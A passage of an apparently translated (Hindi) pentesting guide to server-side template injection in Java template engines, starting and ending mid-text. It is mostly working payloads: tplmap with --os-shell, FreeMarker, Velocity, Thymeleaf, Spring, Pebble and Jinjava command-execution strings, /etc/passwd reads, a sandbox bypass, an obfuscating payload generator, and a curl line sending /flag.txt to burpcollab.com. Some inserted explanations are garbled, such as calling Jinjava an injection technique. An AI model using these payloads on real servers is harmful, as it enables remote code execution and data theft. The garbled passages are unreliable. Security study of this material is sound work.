рд╡рд┐рдХрд╛рд╕рдХ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рд╕рдореЗрдЯ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рднрд┐рдиреНрди рдЯреЗрдореНрдкрд▓реЗрдЯ рдореЗрдВ рднрд┐рдиреНрди рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдкреНрд░рддреНрдпреЗрдХ рдЕрд▓рдЧ рдЯреЗрдореНрдкрд▓реЗрдЯ рдкрд░ рд▓рд╛рдЧреВ рдХреА рдЬрд╛рдиреА рдЪрд╛рд╣рд┐рдПред

**рд╣рдорд▓рд╛**

рдЗрд╕ рдмрд┐рдВрджреБ рдкрд░ рдЖрдкрдХреЛ рдЕрдкрдиреЗ рдкрд╛рд╕ рдЙрдкрд▓рдмреНрдз **рд╣рдорд▓рд╛ рд╕рддрд╣ рдХреА рдПрдХ рджреГрдврд╝ рд╡рд┐рдЪрд╛рд░** рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдФрд░ рдкрд╛рд░рдВрдкрд░рд┐рдХ рд╕реБрд░рдХреНрд╖рд╛ рдореВрд▓реНрдпрд╛рдВрдХрди рддрдХрдиреАрдХреЛрдВ рдХреЗ рд╕рд╛рде рдЖрдЧреЗ рдмрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдХреНрд╖рдо рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рдкреНрд░рддреНрдпреЗрдХ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдЬрд╛рдВрдЪреЗрдВ рдФрд░ рдЙрдЪрд┐рдд рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдпреЛрдЧреНрдп рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХреА рд╕рдореАрдХреНрд╖рд╛ рдХрд░реЗрдВред рдЗрд╕реЗ рд╡реНрдпрд╛рдкрдХ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ рджреЗрдЦрдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ - рдХреБрдЫ рдлрд╝рдВрдХреНрд╢рди рдЕрдиреБрдкреНрд░рдпреЛрдЧ-рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╕реБрд╡рд┐рдзрд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛ
```python
python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
```
## рдЕрдкрд╢рд┐рд╖реНрдЯ

### рд╕рд╛рдорд╛рдиреНрдп

рдЗрд╕ **рд╢рдмреНрджрд╕реВрдЪреА** рдореЗрдВ рдЖрдк рдХреБрдЫ рдЗрдВрдЬрдиреЛрдВ рдХреЗ рдкрд░реНрдпрд╛рд╡рд░рдг рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд **рдЪрд░реЛрдВ** рдХреЛ рдвреВрдВрдв рд╕рдХрддреЗ рд╣реИрдВ:

* [https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt)

### рдЬрд╛рд╡рд╛

**рдЬрд╛рд╡рд╛ - рдореВрд▓ рдЕрд╡рд░реЛрдзрди**
```java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
```
**Java - рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░реЛрдВ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**

To retrieve the system's environment variables in Java, you can use the `System.getenv()` method. This method returns a `Map` object containing all the environment variables and their corresponding values.

Here is an example code snippet:

```java
import java.util.Map;

public class EnvironmentVariables {
    public static void main(String[] args) {
        Map<String, String> env = System.getenv();
        for (String key : env.keySet()) {
            String value = env.get(key);
            System.out.println(key + " = " + value);
        }
    }
}
```

This code will print out all the environment variables and their values. You can customize the code to suit your specific needs, such as filtering or manipulating the environment variables data.

Note: It is important to handle the retrieved environment variables with caution, as they may contain sensitive information that could be exploited by attackers.
```java
${T(java.lang.System).getenv()}
```
**Java - /etc/passwd рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**

рдпрд╣ рддрдХрдиреАрдХ Server-Side Template Injection (SSTI) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ Java рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ /etc/passwd рдлрд╝рд╛рдЗрд▓ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИред рдпрд╣ рддрдХрдиреАрдХ рдЙрди рдЬрдЧрд╣реЛрдВ рдкрд░ рдХрд╛рдо рдХрд░рддреА рд╣реИ рдЬрд╣рд╛рдВ рдПрдХ рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬреЗрдХреНрд╢рди рд╡рд┐рдзрд┐ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬреЗрдХреНрд╢рди рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

рдпрд╣рд╛рдВ рдПрдХ рдЙрджрд╛рд╣рд░рдг рд╣реИ рдХрд┐ рдХреИрд╕реЗ рдЖрдк рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ /etc/passwd рдлрд╝рд╛рдЗрд▓ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

```java
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class Main {
    public static void main(String[] args) throws Exception {
        String command = "cat /etc/passwd";
        Process process = Runtime.getRuntime().exec(command);
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        String line;
        while ((line = reader.readLine()) != null) {
            System.out.println(line);
        }
        reader.close();
    }
}
```

рдЗрд╕ рдХреЛрдб рдХреЗ рджреНрд╡рд╛рд░рд╛, рд╣рдо рдПрдХ рдирдпрд╛ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╢реБрд░реВ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕реЗ `/etc/passwd` рдлрд╝рд╛рдЗрд▓ рдХреЛ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рдВрдЯрд┐рдд рдХрд░рддреЗ рд╣реИрдВред рдлрд╝рд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП рд╣рдо `BufferedReader` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕реЗ рдкреНрд░рд┐рдВрдЯ рдХрд░рддреЗ рд╣реИрдВред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рддрдХрдиреАрдХ рдХреЗрд╡рд▓ рдЙрджреНрджреЗрд╢реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рд╣реИ рдФрд░ рдХрд┐рд╕реА рднреА рдЕрдирдзрд┐рдХреГрдд рдЧрддрд┐рд╡рд┐рдзрд┐ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХреА рдЬрд╛рдиреА рдЪрд╛рд╣рд┐рдПред
```java
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
### FreeMarker (рдЬрд╛рд╡рд╛)

рдЖрдк рдЕрдкрдиреЗ рдкреЗрд▓реЛрдб рдХреЛ [https://try.freemarker.apache.org](https://try.freemarker.apache.org) рдкрд░ рдЖрдЬрдорд╛ рд╕рдХрддреЗ рд╣реИрдВред

* `{{7*7}} = {{7*7}}`
* `${7*7} = 49`
* `#{7*7} = 49 -- (рдкреБрд░рд╛рдирд╛)`
* `${7*'7'} рдХреБрдЫ рдирд╣реАрдВ`
* `${foobar}`
```java
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}

${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```
**Freemarker - рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдмрд╛рдИрдкрд╛рд╕**

тЪая╕П рдХреЗрд╡рд▓ Freemarker рд╕рдВрд╕реНрдХрд░рдг 2.3.30 рд╕реЗ рдкрд╣рд▓реЗ рдХрд╛рдо рдХрд░реЗрдЧрд╛
```java
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```
**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**

* [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection) рдХреЗ FreeMarker рдЕрдиреБрднрд╛рдЧ рдореЗрдВ
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker)

### Velocity (Java)
```java
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```
**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**

* [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection) рдХреЗ Velocity рдЦрдВрдб рдореЗрдВ
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity)

### Thymeleaf (рдЬрд╛рд╡рд╛)

SSTI рдХреЗ рд▓рд┐рдП рдкреНрд░рд╛рдпрдГ рдкрд░реАрдХреНрд╖рдг рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐ `${7*7}` рд╣реИред рдпрд╣ рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐ Thymeleaf рдореЗрдВ рднреА рдХрд╛рдо рдХрд░рддреА рд╣реИред рдпрджрд┐ рдЖрдк рджреВрд░рд╕реНрде рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкрд░реАрдХреНрд╖рдг рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐рдпреЛрдВ рдореЗрдВ рд╕реЗ рдПрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

* SpringEL: `${T(java.lang.Runtime).getRuntime().exec('calc')}`
* OGNL: `${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("calc")}`

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЬреИрд╕рд╛ рдХрд┐ рд╣рдордиреЗ рдкрд╣рд▓реЗ рдХрд╣рд╛ рдерд╛, рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐рдпрд╛рдБ рдХреЗрд╡рд▓ рд╡рд┐рд╢реЗрд╖ Thymeleaf рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рдореЗрдВ рдХрд╛рдо рдХрд░рддреА рд╣реИрдВред рдпрджрд┐ рдЖрдкрдХреЛ рдЯреЗрдореНрдкрд▓реЗрдЯ рдореЗрдВ рдПрдХ рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИ рдЬреЛ рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреЗ рдЕрд▓рдЧ рд╕реНрдерд╛рди рдкрд░ рд╣реЛ, рддреЛ Thymeleaf _рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐ рд╕рдорд╛рдиреНрдпреАрдХрд░рдг_ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рд╕реБрд╡рд┐рдзрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ `[[...]]` рдпрд╛ `[(...)]` рдХреЗ рднреАрддрд░ рдПрдХ рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐ рд░рдЦрдиреА рд╣реЛрдЧреА (рд╡рд┐рд╢реЗрд╖ рдкреНрд░рддреАрдХреЛрдВ рдХреЛ рдЫреЛрдбрд╝рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдиреЗ рдкрд░ рдПрдХ рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ)ред рдЗрд╕рд▓рд┐рдП, Thymeleaf рдХреЗ рд▓рд┐рдП рдПрдХ рд╕рд╛рдзрд╛рд░рдг SSTI рдкрд╣рдЪрд╛рди рдкреЗрд▓реЛрдб `[[${7*7}]]` рд╣реЛрдЧрд╛ред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЙрдкрд░реЛрдХреНрдд рдкрд╣рдЪрд╛рди рдкреЗрд▓реЛрдб рдХрд╛рдо рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рдмрд╣реБрдд рдХрдо рд╣реЛрддреА рд╣реИред SSTI рд╕рдВрд░рдЪрдирд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдЖрдорддреМрд░ рдкрд░ рдХреЛрдб рдореЗрдВ рдбрд╛рдЗрдирд╛рдорд┐рдХ рд░реВрдк рд╕реЗ рдЙрддреНрдкрдиреНрди рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреЗ рд╕рд╛рде рд╣реЛрддрд╛ рд╣реИред Thymeleaf, рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, рдРрд╕реЗ рдбрд╛рдЗрдирд╛рдорд┐рдХ рд░реВрдк рд╕реЗ рдЙрддреНрдкрдиреНрди рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗрддрд╛ рд╣реИ рдФрд░ рд╕рднреА рдЯреЗрдореНрдкрд▓реЗрдЯ рдкрд╣рд▓реЗ рд╕реЗ рдмрдирд╛рдП рдЬрд╛рдиреЗ рдЪрд╛рд╣рд┐рдПред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдПрдХ рдбреЗрд╡рд▓рдкрд░ рдХрд┐рд╕реА рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╕реЗ рдЯреЗрдореНрдкрд▓реЗрдЯ рдмрдирд╛рдирд╛ рдЪрд╛рд╣рддрд╛ рд╣реИ, рддреЛ рдЙрдиреНрд╣реЗрдВ рдЕрдкрдирд╛ рдЦреБрдж рдХрд╛ TemplateResolver рдмрдирд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред рдпрд╣ рд╕рдВрднрд╡ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рдмрд╣реБрдд рд╣реА рдХрдо рд╣реЛрддрд╛ рд╣реИред

рдпрджрд┐ рд╣рдо Thymeleaf рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬрди рдХреЗ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг рдореЗрдВ рдЧрд╣рд░рд╛рдИ рд╕реЗ рджреЗрдЦреЗрдВ, рддреЛ рд╣рдореЗрдВ _**рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐ рдкреВрд░реНрд╡рд╕рдВрд╕реНрдХрд░рдг**_ рдХреА рдПрдХ рджрд┐рд▓рдЪрд╕реНрдк рд╕реБрд╡рд┐рдзрд╛ рдорд┐рд▓реЗрдЧреАред рдбрдмрд▓ рдЕрдВрдбрд░рд╕реНрдХреЛрд░ (`__...__`) рдХреЗ рдмреАрдЪ рд░рдЦреЗ рдЧрдП рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐рдпрд╛рдБ рдкреВрд░реНрд╡рд╕рдВрд╕реНрдХреГрдд рдХреА рдЬрд╛рддреА рд╣реИрдВ рдФрд░ рд╕рд╛рдорд╛рдиреНрдп рдкреНрд░рд╕рдВрд╕реНрдХрд░рдг рдХреЗ рджреМрд░рд╛рди рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐ рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣рд╛рдВ рдерд╛рдЗрдорд▓реАрдлрд╝ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг рд╕реЗ рдПрдХ рдЖрдзрд┐рдХрд╛рд░рд┐рдХ рдЙрджрд╛рд╣рд░рдг рд╣реИ:
```java
#{selection.__${sel.code}__}
```
**рднреЗрджреНрдп рдЙрджрд╛рд╣рд░рдг**
```markup
<a th:href="@{__${path}__}" th:title="${title}">
<a th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('curl -d @/flag.txt burpcollab.com')}" th:title='pepito'>

http://localhost:8082/(7*7)
http://localhost:8082/(${T(java.lang.Runtime).getRuntime().exec('calc')})
```
**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**

* [https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### рд╕реНрдкреНрд░рд┐рдВрдЧ рдлреНрд░реЗрдорд╡рд░реНрдХ (рдЬрд╛рд╡рд╛)
```java
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```
**рдлрд╝рд┐рд▓реНрдЯрд░ рджреНрд╡рд╛рд░рд╛ рдЫрд▓ рдХрд░реЗрдВ**

рдпрджрд┐ `${...}` рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ рддреЛ `#{...}`, `*{...}`, `@{...}` рдпрд╛ `~{...}` рдХрд╛ рдкреНрд░рдпреЛрдЧ рдХрд░реЗрдВред

* `/etc/passwd` рдкрдврд╝реЗрдВ
```java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
* рдкреЗрд▓реЛрдб рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╕реНрдЯрдо рд╕реНрдХреНрд░рд┐рдкреНрдЯ
```python
#!/usr/bin/python3

## Written By Zeyad Abulaban (zAbuQasem)
# Usage: python3 gen.py "id"

from sys import argv

cmd = list(argv[1].strip())
print("Payload: ", cmd , end="\n\n")
converted = [ord(c) for c in cmd]
base_payload = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec'
end_payload = '.getInputStream())}'

count = 1
for i in converted:
if count == 1:
base_payload += f"(T(java.lang.Character).toString({i}).concat"
count += 1
elif count == len(converted):
base_payload += f"(T(java.lang.Character).toString({i})))"
else:
base_payload += f"(T(java.lang.Character).toString({i})).concat"
count += 1

print(base_payload + end_payload)
```
**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**

* [Thymleaf SSTI](https://javamana.com/2021/11/20211121071046977B.html)
* [Payloads all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#java---retrieve-etcpasswd)

### рд╕реНрдкреНрд░рд┐рдВрдЧ рд╡реНрдпреВ рдорд╛рдирд┐рдкреБрд▓реЗрд╢рди (рдЬрд╛рд╡рд╛)
```java
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
__${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x
```
* [https://github.com/veracode-research/spring-view-manipulation](https://github.com/veracode-research/spring-view-manipulation)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Pebble (Java)

* `{{ рдХреБрдЫрд╕реНрдЯреНрд░рд┐рдВрдЧ.toUPPERCASE() }}`

рдкреБрд░рд╛рдирд╛ рд╕рдВрд╕реНрдХрд░рдг Pebble ( < рд╕рдВрд╕реНрдХрд░рдг 3.0.9):
```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}
```
рдирдИ рд╕рдВрд╕реНрдХрд░рдг рдХрд╛ рдкреЗрдмрд▓:
```java
{% raw %}
{% set cmd = 'id' %}
{% endraw %}


{% set bytes = (1).TYPE
.forName('java.lang.Runtime')
.methods[6]
.invoke(null,null)
.exec(cmd)
.inputStream
.readAllBytes() %}
{{ (1).TYPE
.forName('java.lang.String')
.constructors[0]
.newInstance(([bytes]).toArray()) }}
```
### Jinjava (рдЬрд╛рд╡рд╛)

Jinjava рдПрдХ рдЬрд╛рд╡рд╛ рдЖрдзрд╛рд░рд┐рдд рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬреЗрдХреНрд╢рди (SSTI) рдЯреЗрдХреНрдирд┐рдХ рд╣реИ, рдЬреЛ рдЬрд╛рд╡рд╛ рдкреНрд░реЛрдЧреНрд░рд╛рдорд┐рдВрдЧ рднрд╛рд╖рд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдПрдХ рд╢рдХреНрддрд┐рд╢рд╛рд▓реА рдФрд░ рд▓реЛрдХрдкреНрд░рд┐рдп рд╡рд┐рдХрд▓реНрдк рд╣реИ, рдЬреЛ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреЛрдВ рдореЗрдВ рдЙрдкрдпреЛрдЧ рд╣реЛрддрд╛ рд╣реИред Jinjava рдХрд╛ рдЙрдкрдпреЛрдЧ рдЯреЗрдореНрдкрд▓реЗрдЯ рдореЗрдВ рдбрд╛рдпрдирд╛рдорд┐рдХ рдбреЗрдЯрд╛ рдХреЛ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЬрдм рдПрдХ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди Jinjava рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдЯреЗрдореНрдкрд▓реЗрдЯ рдореЗрдВ рдЕрджреНрдпрддрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рддреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдПрдХреНрд╕рдкреНрд░реЗрд╢рди рдХреЗ рд░реВрдк рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдбреЗрдЯрд╛рдмреЗрд╕ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддрд╛ рд╣реИ, рдФрд░ рдЕрдиреНрдп рдиреБрдХрд╕рд╛рди рдкрд╣реБрдВрдЪрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЬрд┐рдирдЬрд╛рд╡рд╛ рдХреЗ рдПрдХ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд░реВрдк рдореЗрдВ, рдпрджрд┐ рдПрдХ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЙрдирдХреЗ рдирд╛рдо рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рд╕реНрд╡рд╛рдЧрдд рдХрд░рддрд╛ рд╣реИ, рддреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдЕрджреНрдпрддрд┐рдд рдЯреЗрдореНрдкрд▓реЗрдЯ рджреНрд╡рд╛рд░рд╛ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

```java
{{ user.name }}
```

рдЗрд╕рдХреЗ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдирд╛рдо рдХреЗ рд╕реНрдерд╛рди рдкрд░ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЙрдиреНрд╣реЗрдВ рдЕрдирдЪрд╛рд╣реЗ рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдВрдЪ рдорд┐рд▓ рд╕рдХрддреА рд╣реИред

